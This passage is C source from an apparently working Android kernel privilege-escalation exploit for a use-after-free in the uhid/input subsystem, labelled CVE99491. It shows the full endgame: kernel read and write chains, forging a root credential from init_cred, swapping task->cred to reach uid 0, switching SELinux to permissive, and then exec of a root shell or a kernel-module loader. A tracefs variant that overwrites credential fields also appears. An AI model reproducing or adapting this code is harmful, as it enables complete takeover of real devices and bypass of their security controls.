               g_trigger_chain ? "fake-handle chain" : "direct-vals");
        printf("TRIGGER_PROBE_OK\n");
        spawn_armed_holder();
        finish_stage_ok();
    }
    printf("[-] trigger probe: %s path did not land the fixed word "
           "(selinux_state unchanged)\n",
           g_trigger_chain ? "fake-handle chain" : "direct-vals");
    printf("TRIGGER_PROBE_FAIL\n");
    abort_armed_and_park("trigger probe: fixed-word write did not land");
}

    /* --- exploit: forged cred -> uid-0 shell ------------------------- */
    /*
     * One anchor does everything: outq[0] is the read pointer and the
     * input_buf carries the chain objects plus the forged cred (embedded
     * at C_OFF_FAKE from the forgery step on).  The bootstrap and the
     * arming retriggers are pad-triggered and oracle-verified; once the
     * uinput trigger's grab points at the anchor handle every later
     * write is "rewrite the anchor + inject one event", with no UAF and
     * no respray.  Writes are verified before the next step:
     *   - the selinux_state clear by /sys/fs/selinux/enforce,
     *   - the task pointer by a comm marker read back with prctl(),
     *   - the cred swap by getuid()/getgid().
     * The swap record sits at cred-2: its type word lands on
     * real_cred[6..7], restored immediately afterwards by the EV_ABS
     * 4-byte store (the chain sleeps were shortened so that window is
     * about a millisecond).  The outq is disarmed and enforcing is
     * restored before exec; the process then execs /system/bin/sh in
     * place, so commit_creds() sees cred == real_cred.  A detached holder
     * records PARKED and keeps the armed descriptors alive.
     */
static int run_real_cred(struct anchor *a, unsigned long long base,
                         unsigned long long slide, const struct exp_opts *o)
{
        long spray_n = o->spray_n, spread_ms = o->spread_ms;
        int cpu = o->cpu;
        struct pchain pa;
        unsigned char buf[4096];
        unsigned char prev[64];
        unsigned char icred[CVE99491_CRED_MAX];
        unsigned char name[32];
        unsigned long long p0 = base + UHID_OUTQ_OFF;
        unsigned long long offs[8] = { 0 };
        unsigned long long task = 0, idle = 0, fake, eff = 0;
        unsigned long long rqv, ic, sel;
        unsigned long long mark = 0x4d4b4a4cULL;
        int i, ok = 0;

        memset(&pa, 0, sizeof(pa));
        pa.a = a;
        pa.base = base;
        pa.slide = slide;
        pa.pad_fd = -1;
        signal(SIGHUP, SIG_IGN);
        signal(SIGTERM, SIG_IGN);
        signal(SIGINT, SIG_IGN);
        if (pin_cpu(cpu) != 0) {
            perror("sched_setaffinity");
            return 1;
        }
        if (spray_setup() < 0 || rd_page_setup() < 0)
            return 1;
        /* Create the uinput trigger before the UAF.  Its input_dev,
         * absinfo and evdev objects are kmalloc-2k; if they were created
         * after the touch input_dev is freed they could take the dangling
         * slot and the pad report would treat them as input_dev. */
        if (uinput_trigger_open() < 0)
            PLOG("uinput pre-open failed; pad chain only\n");
        /* Bootstrap, self-cell, the input_dev_list walk, the sniff/scan
         * and the grab stores all still spend pad fires; keep headroom
         * for read retries. */
        g_fire_cap = 64;

        /* Record PARKED before the first fire: from here on this boot holds
         * slab state that a second run must not touch.  Every armed holder
         * re-marks it, so a run that dies after arming still blocks the
         * rest of the boot. */
        (void)cve99491_parked_mark_in(g_run_dir);

        /* 1. Bootstrap pinned to the target CPU: UHID_DESTROY frees the
         * touch input_dev synchronously on this CPU, so the burst lands on
         * the freed slot without cross-CPU guessing. */
        if (pchain_first(&pa, p0, EV_PWR, (unsigned)((p0 >> 16) & 0xffff),
                         (int)(p0 >> 32), spray_n, spread_ms) < 0) {
            if (g_stage == STAGE_ORACLE)
                abort_armed_and_park("oracle stage: reclaim not verified");
            abort_armed_and_park("bootstrap fire failed");
        }
        /* --stage=oracle: the verified reclaim is the whole goal.  The
         * oracle-only hook stopped inside pchain_first before any kernel
         * write; keep the armed descriptors with a holder and report. */
        if (g_stage == STAGE_ORACLE) {
            printf("[+] oracle stage complete (no kernel write)\n");
            PLOG("oracle stage complete (no write)\n");
            spawn_armed_holder();
            finish_stage_ok();
        }
        PLOG("self cell arm\n");
        for (i = 0; i < 12 && !ok; i++) {
            int wrc, rrc = -1;

            wrc = pc_write(&pa, base + UHID_HEAD_OFF, 0,
                           (int)(p0 & 0xffffffff), spray_n);
            rrc = outq_read(a, buf, 4096);
            ok = wrc == 0 && rrc == 0 &&
                 *(unsigned long long *)buf == p0;
            if (getenv("CVE99491_CHAIN_DEBUG")) {
                int re = errno;

                printf("[dbg] selfcell i=%d wrc=%d rrc=%d errno=%d "
                       "read=%#llx want=%#llx\n", i, wrc, rrc, re,
                       rrc == 0 ? *(unsigned long long *)buf : 0ULL, p0);
                PLOG("dbg selfcell i=%d wrc=%d rrc=%d errno=%d\n",
                     i, wrc, rrc, re);
            }
            if (wrc < 0)
                break;
        }
        if (!ok)
            abort_armed_and_park("self cell install failed");
        memcpy(prev, buf, sizeof(prev));
        g_spread_ms = 0;
        printf("[+] self cell %#llx\n", p0);
        PLOG("self cell installed\n");

        /* 2. Arm the uinput trigger now.  The input_dev_list walk needs
         * only the KASLR slide and our pre-created uinput device, not the
         * task, so every later read/write can run without a reclaim. */
        if (g_uin_fd >= 0 && uchain_setup(&pa, slide, spray_n) == 0) {
            g_uchain = 1;
        } else {
            printf("[!] uinput trigger unavailable; pad chain fallback\n");
            PLOG("uinput setup failed; pad chain fallback\n");
        }

        /* 3. __per_cpu_offset[]: per-cpu arenas are not slab objects.
         * The uinput read keeps the 64-byte short-copy path so a stale
         * slab target can never trip hardened usercopy. */
        if (read_static(&pa, SYM_PER_CPU_OFFSET + slide, prev, buf, 64,
                        spray_n) < 0)
            abort_armed_and_park("__per_cpu_offset read failed");
        for (i = 0; i < 8; i++)
            offs[i] = *(unsigned long long *)(buf + 8 * i);
        memcpy(prev, buf, sizeof(prev));
        if (!is_kptr(SYM_RUNQUEUES + slide + offs[0]))
            abort_armed_and_park("per-cpu offsets invalid");
        printf("[+] cpu%d runqueue %#llx\n", cpu,
               SYM_RUNQUEUES + slide + offs[cpu]);

        /* 4. init_cred: statically readable, template for the forgery. */
        ic = INIT_CRED_ADDR + slide;
        if (read_static(&pa, ic, prev, buf, CRED_SIZE, spray_n) < 0)
            abort_armed_and_park("init_cred read failed");
        memcpy(prev, buf, sizeof(prev));
        memcpy(icred, buf, CRED_SIZE);
        if (*(uint32_t *)(icred + 8) != 0 ||
            !is_kptr(*(unsigned long long *)(icred + CR_SECURITY)) ||
            !is_kptr(*(unsigned long long *)(icred + CR_USER)) ||
            !is_kptr(*(unsigned long long *)(icred + CR_USER_NS)))
            abort_armed_and_park("init_cred content unexpected");
        printf("[+] init_cred security=%#llx user=%#llx ns=%#llx cap=%#llx\n",
               *(unsigned long long *)(icred + CR_SECURITY),
               *(unsigned long long *)(icred + CR_USER),
               *(unsigned long long *)(icred + CR_USER_NS),
               *(unsigned long long *)(icred + CR_CAP_EFF));

        /* 5. Current task from rq->curr of the CPU we are pinned to: the
         * copy runs inside our own read() syscall on that CPU, so the
         * scheduler has rq->curr == us for the whole copy. */
        {
            cpu_set_t set;
            CPU_ZERO(&set);
            CPU_SET(cpu, &set);
            sched_setaffinity(0, sizeof(set), &set);
        }
        rqv = SYM_RUNQUEUES + slide + offs[cpu];
        ok = 0;
        for (i = 0; i < 3 && !ok; i++) {
            if (read_static(&pa, rqv + RQ_OFF_CURR, prev, buf, 32,
                            spray_n) < 0)
                continue;
            task = *(unsigned long long *)buf;
            idle = *(unsigned long long *)(buf + RQ_OFF_IDLE - RQ_OFF_CURR);
            if (is_kptr(task) && task != idle) {
                memcpy(prev, buf, sizeof(prev));
                ok = 1;
            }
        }
        if (!ok)
            abort_armed_and_park("rq->curr read failed");
        printf("[+] task %#llx (idle %#llx)\n", task, idle);
        PLOG("task=%#llx idle=%#llx\n", task, idle);

        /* 6. Task identity: drop a marker into task->comm and read it
         * back through prctl().  get_task_comm() strscpy_pad()s, so the
         * record's NUL at comm[1] hides code/value: the EV_PWR type byte
         * arriving in comm[0] is the proof, and a wrong task leaves the
         * name untouched.  No cred write happens on a guess. */
        {
            int marked = 0;
            int ufail = 0;
            memset(name, 0, sizeof(name));
            if (prctl(PR_GET_NAME, name, 0, 0, 0) != 0)
                abort_armed_and_park("cannot read own comm");
            if (name[0] == 0x16)
                abort_armed_and_park("comm already carries the marker");
            for (i = 0; i < 4 && !marked; i++) {
                int wrote = 0;

                memset(name, 0, sizeof(name));
                if (g_uchain && !ufail)
                    wrote = uchain_re(&pa, task + TS_OFF_COMM, EV_PWR,
                                      (unsigned)(mark & 0xffff),
                                      (int)(mark >> 16)) == 0;
                else if (pc_write(&pa, task + TS_OFF_COMM,
                                  (unsigned)(mark & 0xffff),
                                  (int)(mark >> 16), spray_n) == 0)
                    wrote = 1;
                if (!wrote)
                    break;
                usleep(1000);
                if (prctl(PR_GET_NAME, name, 0, 0, 0) != 0)
                    continue;
                printf("[*] comm probe %d: %02x %02x %02x %02x\n", i + 1,
                       name[0], name[1], name[2], name[3]);
                if (name[0] == 0x16 && name[1] == 0x00)
                    marked = 1;
                if (!marked && g_uchain && !ufail) {
                    PLOG("uinput comm miss; pad fallback\n");
                    ufail = 1;
                }
            }
            if (ufail)
                g_uchain = 0;
            if (!marked) {
                abort_armed_and_park("comm marker did not land; "
                                     "task pointer unverified");
            }
        }
        printf("[+] task pointer verified through comm\n");
        PLOG("task verified\n");

        /* Port gate: --stage=write.  One 8-byte write into our own cred,
         * cap_effective (uid/euid/fsuid untouched).  The EV_PWR record
         * stores {type=0x0016, code=0, value=0} = 0x16, i.e. only the DAC
         * capability bits, observable via capget(); the process exits right
         * after the check so nothing keeps those bits.  The holder is forked
         * first so it inherits the unmodified creds. */
        if (g_stage == STAGE_WRITE) {
            unsigned long long weff = 0;
            int wlanded = 0;

            printf("[step] write stage: single 8-byte cap_effective write\n");
            spawn_armed_holder();
            for (i = 0; i < 4 && !wlanded; i++) {
                int wrote = 0;

                if (g_uchain)
                    wrote = uchain_re(&pa, task + TS_OFF_CRED + CR_CAP_EFF,
                                      EV_PWR, 0, 0) == 0;
                else
                    wrote = pc_write(&pa, task + TS_OFF_CRED + CR_CAP_EFF,
                                     0, 0, spray_n) == 0;
                if (!wrote)
                    continue;
                usleep(1000);
                if (probe_caps(&weff) == 0 && weff == 0x16ULL)
                    wlanded = 1;
                printf("[*] write probe %d: cap_effective=%#llx\n", i + 1,
                       weff);
                PLOG("write probe %d eff=%#llx ufail=%d\n", i + 1, weff,
                     g_uchain ? 0 : 1);
                if (!wlanded && g_uchain) {
                    printf("[!] uinput chain miss; pad chain fallback\n");
                    PLOG("uinput write miss; pad fallback\n");
                    g_uchain = 0;
                }
            }
            if (!wlanded)
                abort_armed_and_park("write stage: cred field write did not land");
            if (getuid() != 2000 || geteuid() != 2000)
                abort_armed_and_park("write stage: uid/euid changed unexpectedly");
            printf("[+] write cap_effective=%#llx uid=2000 euid=2000 "
                   "uid_unchanged=1\n", weff);
            PLOG("write stage complete eff=%#llx\n", weff);
            if (!disarm_outq_chain(&pa, spray_n))
                abort_armed_and_park("write stage: outq disarm failed");
            printf("[+] write stage complete\n");
            finish_stage_ok();
        }

        /* 7. SELinux permissive.  Eight zero bytes at selinux_state also
         * clear initialized: with the policy "not initialized"
         * security_context_to_sid() only knows the initial SID names and
         * falls back to SECINITSID_KERNEL, so a later setcon would write
         * the kernel SID straight back.  The initialized byte is restored
         * with an EV_ABS 4-byte store right before setcon (step 11). */
        sel = SYM_SELINUX_STATE + slide + SEL_ENF_OFF;
        ok = 0;
        {
            int ufail = 0;

            for (i = 0; i < 4 && !ok; i++) {
                int wrote = 0;

                printf("[step] permissive try %d\n", i + 1);
                if (g_uchain && !ufail) {
                    /* EV_ABS cannot be used here: input_handle_abs_event()
                     * reads the fuzz field at target+12, and on this
                     * build selinux_state+12 holds policycap[10..13]
                     * (0x01010101), so a 0 store is defuzzed back to the
                     * old value and silently dropped.  The 8-byte zero
                     * record has no such filter. */
                    if (uchain_re(&pa, sel, EV_SYN, SYN_REPORT, 0) == 0)
                        wrote = 1;
                } else if (pchain_re(&pa, sel, EV_SYN, SYN_REPORT, 0,
                                     spray_n) == 0) {
                    spray_drain();
                    wrote = 1;
                }
                if (!wrote)
                    break;
                usleep(1000);
                if (selinux_enforce_now() == 0)
                    ok = 1;
                PLOG("permissive try %d enforce=%d ufail=%d\n", i + 1,
                     selinux_enforce_now(), ufail);
                if (!ok && g_uchain && !ufail) {
                    printf("[!] uinput chain miss; pad chain fallback\n");
                    PLOG("uinput chain miss; pad fallback\n");
                    ufail = 1;
                }
            }
            if (ufail)
                g_uchain = 0;
        }
        if (!ok)
            abort_armed_and_park("selinux_state write did not land");
        printf("[+] SELinux permissive (policy live)\n");
        PLOG("selinux off\n");

        /* Port gate: --stage=selinux.  Open the window, prove it with
         * selinuxfs, then write {enforcing=1, initialized=1} back through the
         * chain (0x101; the EV_ABS fuzz dword at selinux_state+12 needs the
         * distant prime first), disarm the outq and leave Enforcing. */
        if (g_stage == STAGE_SELINUX) {
            int restored = 0;

            printf("[step] selinux stage: restore enforcing\n");
            for (i = 0; i < 4 && !restored; i++) {
                if (g_uchain) {
                    if (uchain_re(&pa, sel, EV_ABS, 0,
                                  (int)SEL_PRIME) < 0 ||
                        uchain_re(&pa, sel, EV_ABS, 0, 0x101) < 0)
                        break;
                } else {
                    if (pchain_re(&pa, sel, EV_ABS, 0, (int)SEL_PRIME,
                                  spray_n) < 0)
                        break;
                    spray_drain();
                    if (pchain_re(&pa, sel, EV_ABS, 0, 0x101, spray_n) < 0)
                        break;
                    spray_drain();
                }
                usleep(1000);
                if (selinux_enforce_now() == 1)
                    restored = 1;
                printf("[*] selinux restore try %d enforce=%d\n", i + 1,
                       selinux_enforce_now());
                PLOG("selinux restore try %d enforce=%d\n", i + 1,
                     selinux_enforce_now());
            }
            if (!restored)
                restore_enforcing_and_park(
                    "selinux stage: enforcing restore failed");
            if (!disarm_outq_chain(&pa, spray_n))
                restore_enforcing_and_park(
                    "selinux stage: outq disarm failed");
            printf("[+] selinux_window restored=1 enforce=%d\n",
                   selinux_enforce_now());
            PLOG("selinux stage complete\n");
            spawn_armed_holder();
            finish_stage_ok();
        }

        /* Protect the holder (and this shell) from the only unsolicited
         * holder death besides shutdown: lmkd/OOM.  Written while
         * permissive, inherited across the coming fork(). */
        {
            char ob[16];
            int fd = open("/proc/self/oom_score_adj",
                          O_WRONLY | O_CLOEXEC);
            if (fd >= 0) {
                (void)!write(fd, "-1000", 5);
                close(fd);
            }
            memset(ob, 0, sizeof(ob));
            fd = open("/proc/self/oom_score_adj", O_RDONLY | O_CLOEXEC);
            if (fd >= 0) {
                (void)!read(fd, ob, sizeof(ob) - 1);
                close(fd);
            }
            printf("[*] oom_score_adj=%d\n", atoi(ob));
            PLOG("oom_score_adj=%d\n", atoi(ob));
        }

        /* 8. Forge the cred inside the anchor input_buf. */
        {
            unsigned long long usage = 0x70000000ULL;
            memcpy(g_cred_blob, icred, CRED_SIZE);
            memcpy(g_cred_blob, &usage, 8);
            memset(g_cred_blob + CR_RCU_OFF, 0, CR_RCU_SIZE);
            g_cred_blob_on = 1;
        }
        fake = base + UHID_DATA_OFF + C_OFF_FAKE;
        printf("[+] forged cred %#llx (usage 0x70000000)\n", fake);
        PLOG("fake cred=%#llx\n", fake);

        /* 9. Swap task->cred.  The 8-byte record at cred-2 is
         * {type=0x0016, code=fake[0..1], value=fake[2..5]}: fake[0..5]
         * lands on cred[0..5] while cred[6..7] keep the old kernel
         * pointer's 0xffff, so cred becomes the forged pointer in one
         * store with no window assumption.  The record's type word
         * lands on real_cred[6..7] and is repaired in step 10; until
         * then real_cred is wild, so nothing may dereference it. */
        ok = 0;
        {
            int ufail = 0;
            int rval = (int)((((unsigned long long)fake & 0xffff) << 16) |
                             0xffff);

            for (i = 0; i < 5 && !ok; i++) {
                int wrote = 0;
                int repaired = 0;

                if (g_uchain && !ufail)
                    wrote = uchain_re(&pa, task + TS_OFF_CRED - 2, EV_PWR,
                                      (unsigned)(fake & 0xffff),
                                      (int)((fake >> 16) & 0xffffffff)) == 0;
                else if (pc_write(&pa, task + TS_OFF_CRED - 2,
                                  (unsigned)(fake & 0xffff),
                                  (int)((fake >> 16) & 0xffffffff),
                                  spray_n) == 0)
                    wrote = 1;
                if (!wrote)
                    break;
                if (getuid() != 0 || getgid() != 0)
                    continue;
                /* The cred-2 record left its type word in real_cred[6..7],
                 * so real_cred is wild until the repair lands.  Do it as
                 * the very next chain write, before any printf/PLOG: those
                 * syscalls (and their fsync) are the only real exposure
                 * this window has. */
                if (g_uchain && !ufail) {
                    repaired = uchain_re(&pa, task + TS_OFF_REAL_CRED + 6,
                                         EV_ABS, 0, rval) == 0;
                    if (!repaired) {
                        PLOG("uinput repair miss; pad fallback\n");
                        ufail = 1;
                        g_uchain = 0;
                    }
                }
                if (!repaired) {
                    if (pchain_re(&pa, task + TS_OFF_REAL_CRED + 6, EV_ABS,
                                  0, rval, spray_n) < 0)
                        abort_armed_and_park("real_cred repair failed");
                    spray_drain();
                }
                ok = 1;
            }
        }
        if (!ok)
            abort_armed_and_park("cred swap did not land");
        /* App marker contract: exact bytes, details on the next line. */
        printf("[+] swap uid=0\n");
        printf("[*] swap: uid=%u gid=%u\n", (unsigned)getuid(),
               (unsigned)getgid());
        PLOG("swap uid=%u gid=%u\n", (unsigned)getuid(), (unsigned)getgid());
        /* No capget here: it reads __task_cred() = real_cred, which was
         * only repaired a moment ago by the uinput write above. */

        /* 10b. Make cred == real_cred.  A record at real_cred-2 writes
         * fake[0..5] over real_cred[0..5] and drops its type word
         * (0x0016) on ptracer_cred[6..7], which is unused while the task
         * is not traced; real_cred[6..7] keeps the 0xffff restored in
         * step 10, so the pointer completes cleanly.  capget reads
         * __task_cred() (real_cred), so it is a safe probe here: full
         * caps means the store took, zero means a miss and a retry. */
        {
            int landed = 0;
            int ufail = 0;

            for (i = 0; i < 4 && !landed; i++) {
                int wrote = 0;

                eff = 0;
                if (g_uchain && !ufail)
                    wrote = uchain_re(&pa, task + TS_OFF_REAL_CRED - 2,
                                      EV_PWR, (unsigned)(fake & 0xffff),
                                      (int)((fake >> 16) & 0xffffffff)) == 0;
                else if (pc_write(&pa, task + TS_OFF_REAL_CRED - 2,
                                  (unsigned)(fake & 0xffff),
                                  (int)((fake >> 16) & 0xffffffff),
                                  spray_n) == 0)
                    wrote = 1;
                if (!wrote)
                    break;
                usleep(1000);
                if (probe_caps(&eff) == 0 && (eff & CAP_LOW_MASK) != 0)
                    landed = 1;
                printf("[*] real_cred probe %d: cap_effective=%#llx\n",
                       i + 1, eff);
                PLOG("real_cred probe %d eff=%#llx ufail=%d\n", i + 1, eff,
                     ufail);
                if (!landed && g_uchain && !ufail) {
                    printf("[!] uinput chain miss; pad chain fallback\n");
                    PLOG("uinput real_cred miss; pad fallback\n");
                    ufail = 1;
                }
            }
            if (ufail)
                g_uchain = 0;
            if (!landed)
                abort_armed_and_park("real_cred did not take the forged cred");
            printf("[+] cred == real_cred\n");
            printf("[*] cred detail: cap_effective=%#llx\n", eff);
        }

        /* 11. setcon while still permissive.  The kernel takes the
         * LSM_ATTR_CURRENT path of selinux_lsm_setattr: prepare_creds()
         * copies the forged cred into a fresh cred_jar object with a
         * regular lsm_cred_alloc() blob, sets its sid to the one resolved
         * from the string, and commit_creds() installs it -- legal because
         * 9b made cred == real_cred.  The forged cred is replaced by a
         * normal, LSM-allocated shell-domain cred. */
        {
            char cur[64];
            int fd;
            ssize_t wr = -1;
            int live = 0;

            /* 11-0. The swap phase deliberately ran with initialized=0:
             * with the policy "live", every syscall of the kernel-SID
             * process is audited under permissive and the spray timing
             * drifts (it panicked the swap fire).  Restore the byte now,
             * right before setcon needs security_context_to_sid() to
             * consult the policy.  {enforcing=0, initialized=1} is
             * little-endian 0x00000100. */
            for (i = 0; i < 3 && !live; i++) {
                /* input_handle_abs_event() defuzzes a 4-byte store with
                 * the dword at target+12; selinux_state+12 is
                 * policycap[10..13] = 0x01010101 here, so a 0x100 store
                 * over the zero left by step 7 would be dropped.  Prime
                 * the slot with a distant value first, then store. */
                if (g_uchain) {
                    if (uchain_re(&pa, sel, EV_ABS, 0,
                                  (int)SEL_PRIME) < 0 ||
                        uchain_re(&pa, sel, EV_ABS, 0,
                                  (int)SEL_RESTORE) < 0)
                        break;
                } else {
                    if (pchain_re(&pa, sel, EV_ABS, 0,
                                  (int)SEL_PRIME, spray_n) < 0)
                        break;
                    spray_drain();
                    if (pchain_re(&pa, sel, EV_ABS, 0,
                                  (int)SEL_RESTORE, spray_n) < 0)
                        break;
                    spray_drain();
                }
                usleep(1000);
                /* Short read: the anchor outq currently points at a
                 * kmalloc-2k input_dev (grab verification).  If this
                 * chain write misses, a full-length copy would hit
                 * hardened usercopy on that slab object and abort. */
                if (pchain_read_n(&pa, sel, prev, buf, 8, spray_n) == 0) {
                    memcpy(prev, buf, 8);
                    printf("[*] state %d: %02x %02x %02x %02x %02x %02x\n",
                           i + 1, buf[0], buf[1], buf[2], buf[3], buf[4],
                           buf[5]);
                    PLOG("state %02x %02x %02x %02x\n", buf[0], buf[1],
                         buf[2], buf[3]);
                    if (buf[0] == 0 && buf[1] == 1)
                        live = 1;
                }
            }
            if (!live)
                abort_armed_and_park("initialized byte restore failed");

            fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
            if (fd >= 0) {
                wr = write(fd, SELINUX_SHELL, strlen(SELINUX_SHELL));
                close(fd);
            }
            printf("[*] setcon rc=%zd errno=%d\n", wr, errno);
            PLOG("setcon rc=%zd errno=%d\n", wr, errno);
            if (wr != (ssize_t)strlen(SELINUX_SHELL))
                abort_armed_and_park("setcon rejected");
            memset(cur, 0, sizeof(cur));
            fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
            if (fd >= 0) {
                (void)!read(fd, cur, sizeof(cur) - 1);
                close(fd);
            }
            printf("[*] attr/current='%s'\n", cur);
            PLOG("current=%s\n", cur);
            if (!strstr(cur, SELINUX_SHELL))
                abort_armed_and_park("setcon did not reach the shell domain");
            printf("[+] setcon\n");

            /* 11-1. Disarm the outq.  uhid_char_release() kfree()s every
             * non-NULL outq slot and outq[0] still points at the last read
             * target (selinux_state); an all-zero record at uhid+4496
             * stores NULL there so releasing the anchor can only
             * kfree(NULL).  This is the last outq[0] operation before
             * exec (the KSU window below only writes selinux_state). */
            if (!disarm_outq_chain(&pa, spray_n))
                abort_armed_and_park("outq disarm failed");
            printf("[+] outq disarmed\n");
            PLOG("outq disarmed\n");

            /* 11-2. back to enforcing through selinuxfs.  sel_write_enforce
             * runs its AVC check while enforcing is still 0 (permissive),
             * then stores exactly 1, so the global state ends clean.
             * The late-load handoff needs the permissive window (ksud
             * writes kptr_restrict and loads the KO), so it is kept when
             * a ksud stage follows and restored by late-su instead;
             * --no-ksu and the external-command form restore it here. */
            if (g_no_ksu || getenv("CVE99491_EXEC_CMD")) {
                fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
                if (fd >= 0) {
                    (void)!write(fd, "1", 1);
                    close(fd);
                }
                printf("[*] getenforce now %d\n", selinux_enforce_now());
                PLOG("enforce=%d\n", selinux_enforce_now());
                if (selinux_enforce_now() == 0)
                    abort_armed_and_park("enforce restore failed");
            } else {
                printf("[*] permissive kept for the late-load handoff\n");
                PLOG("permissive kept\n");
            }
        }

        /* 12. Armed holder.  It keeps the anchor/pad descriptors (and
         * therefore the freed slot's chain) open after the shell exits,
         * records PARKED for this boot, and drops the runner's stdio. */
        {
            pid_t h = fork();
            if (h == 0)
                park_holder();
            printf("[+] armed holder pid %d\n", (int)h);
        }

        PLOG("exec in place eff=%#llx\n", eff);
        oracle_shutdown();
        if (g_no_ksu) {
            /* --no-ksu: stop at the uid-0 shell, no module loading. */
            printf("[+] exec sh in place (cred == real_cred)\n");
            execl("/system/bin/sh", "sh", "-c",
                  "{ id; echo ---; getenforce; echo ---; "
                  "grep -E '^(Uid|Gid|CapInh|CapPrm|CapEff|CapBnd):' "
                  "/proc/self/status; } 2>&1",
                  (char *)NULL);
        } else {
            /* Re-exec in place as the late-load stage: same pid, same
             * cred, so the full capability set survives and the manager's
             * ksud can write kptr_restrict and init_module. */
            char *sav[3];

            printf("[+] exec late-load in place (cred == real_cred)\n");
            sav[0] = (char *)"/proc/self/exe";
            sav[1] = (char *)"late-load";
            sav[2] = NULL;
            execv(sav[0], sav);
        }
        fprintf(stderr, "[-] exec failed: %s\n", strerror(errno));
        _exit(2);
        return 1;
    }
/*
 * tracefs mode [non-mainline]: direct cred/caps writes after a tracefs cred
 * leak.  This is the main-tree endgame; it does not use the forged cred or
 * setcon.  Maintained; the reworked bootstrap+uinput flow measured 5/5 on a
 * clean-boot block.
 */
static int run_tracefs(struct anchor *a, unsigned long long base,
                       unsigned long long slide, const struct exp_opts *o)
{
    unsigned char *raw = NULL;
    unsigned long long R = 0;
    int go = -1, st = -1;
    pid_t child;
    uint32_t hello = 0;
    int win = 0;

    {
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(o->cpu, &set);
        if (sched_setaffinity(0, sizeof(set), &set) != 0) {
            perror("sched_setaffinity");
            return 1;
        }
    }
    if (trace_prepare() != 0) {
        fprintf(stderr, "[-] trace prepare failed\n");
        return 1;
    }
    {
        char sbuf[32];
        snprintf(sbuf, sizeof sbuf, "%#llx", slide);
        setenv("CVE99491_SLIDE", sbuf, 1);
        setenv("CVE99491_WORK", g_prof.ksu_workdir, 1);
    }
    child = spawn_wait_child(o->cpu, &go, &st);
    if (child < 0) {
        fprintf(stderr, "[-] fork failed\n");
        return 1;
    }
    trace_wr(TR_PATH "/tracing_on", "1");
    (void)!write(go, "A", 1);
    usleep(60000);
    trace_wr(TR_PATH "/tracing_on", "0");
    raw = malloc(TRACE_BUF_BYTES);
    if (!raw) {
        park_on_fail("trace buffer alloc failed");
        return 1;
    }
    {
        long n = trace_read_cpu(o->cpu, raw, TRACE_BUF_BYTES);
        if (n > 0)
            R = trace_cred_ptr(raw, n, (int)child);
        free(raw);
        raw = NULL;
        if (R && read_full(st, &hello, sizeof(hello)) == 0 &&
            hello == CHILD_HELLO)
            printf("[+] child %d cred = %#llx (%ld bytes)\n", (int)child, R, n);
        else
            printf("[-] cred leak failed (R=%#llx hello=%#x)\n", R, hello);
    }
    if (!R || hello != CHILD_HELLO) {
        fprintf(stderr, "[-] aborting: no child cred\n");
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
        return 1;
    }
    if (spray_setup() < 0) {
        park_on_fail("spray setup failed");
        return 1;
    }
    /* The endgame writes run over the uinput carrier; create it before the
     * bootstrap touch UAF so its kmalloc-2k objects cannot race the freed
     * touch slot. */
    if (uinput_trigger_open() < 0) {
        park_on_fail("uinput trigger open failed");
        return 1;
    }

    /* Record PARKED before the first 99491 teardown in this mode. */
    (void)cve99491_parked_mark_in(g_run_dir);

    {
        /* Bootstrap exactly like real_cred: a fresh oracle-verified pad
         * reclaim installs the self cell and arms the uinput trigger.  The
         * tracefs cred leak needs no persistent pad session; after this
         * point every cred/caps/permissive write goes through uinput, so
         * no pad report can land on a foreign object. */
        {
            struct pchain pa;
            unsigned long long p0 = base + UHID_OUTQ_OFF;
            unsigned char buf[4096];
            int ok = 0;

            memset(&pa, 0, sizeof(pa));
            pa.a = a;
            pa.base = base;
            pa.slide = slide;
            pa.pad_fd = -1;
            g_fire_cap = 64;
            if (pchain_first(&pa, p0, EV_PWR,
                             (unsigned)((p0 >> 16) & 0xffff),
                             (int)(p0 >> 32), o->spray_n,
                             o->spread_ms) < 0)
                abort_armed_and_park("bootstrap fire failed");
            for (int i = 0; i < 12 && !ok; i++) {
                if (pc_write(&pa, base + UHID_HEAD_OFF, 0,
                             (int)(p0 & 0xffffffff), o->spray_n) < 0)
                    break;
                if (outq_read(a, buf, 4096) != 0)
                    continue;
                ok = *(unsigned long long *)buf == p0;
            }
            if (!ok)
                abort_armed_and_park("self cell install failed");
            printf("[+] self cell %#llx\n", p0);
            g_spread_ms = 0;
            if (g_uin_fd >= 0 && uchain_setup(&pa, slide, o->spray_n) == 0) {
                g_uchain = 1;
            } else {
                abort_armed_and_park("uinput trigger unavailable");
            }
        }

        /* ids: the EV_SYN uinput event carries the kernel's 8-byte zero
         * record at the target; each field is probed before the next. */
        {
            struct pchain cp = { .a = a, .base = base, .slide = slide,
                                 .started = 1 };
            uint32_t ids[4] = { ~0u, ~0u, ~0u, ~0u };

            if (uchain_re(&cp, R + CR_UID, EV_SYN, SYN_REPORT, 0) < 0)
                abort_armed_and_park("uid write failed");
            if (write(go, "p", 1) != 1 ||
                read_full(st, ids, sizeof(ids)) != 0)
                abort_armed_and_park("uid probe failed");
            printf("[*] uid probe: uid=%u euid=%u gid=%u egid=%u\n",
                   ids[0], ids[1], ids[2], ids[3]);
        }
        {
            struct {
                unsigned off, idx;
                const char *name;
            } fields[4] = {
                { CR_UID,      0, "uid"  },
                { CR_UID + 4,  2, "gid"  },
                { CR_EUID,     1, "euid" },
                { CR_EUID + 4, 3, "egid" },
            };
            struct pchain cp = { .a = a, .base = base, .slide = slide,
                                 .started = 1 };
            int ids_ok = 1;

            for (int f = 0; f < 4 && ids_ok; f++) {
                int ok = 0;
                for (int attempt = 0; attempt < 6 && !ok; attempt++) {
                    uint32_t ids[4] = { ~0u, ~0u, ~0u, ~0u };

                    if (uchain_re(&cp, R + fields[f].off, EV_SYN,
                                  SYN_REPORT, 0) < 0)
                        break;
                    if (write(go, "p", 1) != 1 ||
                        read_full(st, ids, sizeof(ids)) != 0)
                        break;
                    printf("[*] %s try %d: uid=%u euid=%u gid=%u egid=%u\n",
                           fields[f].name, attempt + 1, ids[0], ids[1],
                           ids[2], ids[3]);
                    if (ids[fields[f].idx] == 0)
                        ok = 1;
                }
                if (!ok) {
                    printf("[-] %s did not converge\n", fields[f].name);
                    ids_ok = 0;
                }
            }
            win = ids_ok;
            if (win &&
                uchain_re(&cp, R + CR_SECUREBITS, EV_SYN, SYN_REPORT, 0) < 0)
                win = 0;
        }
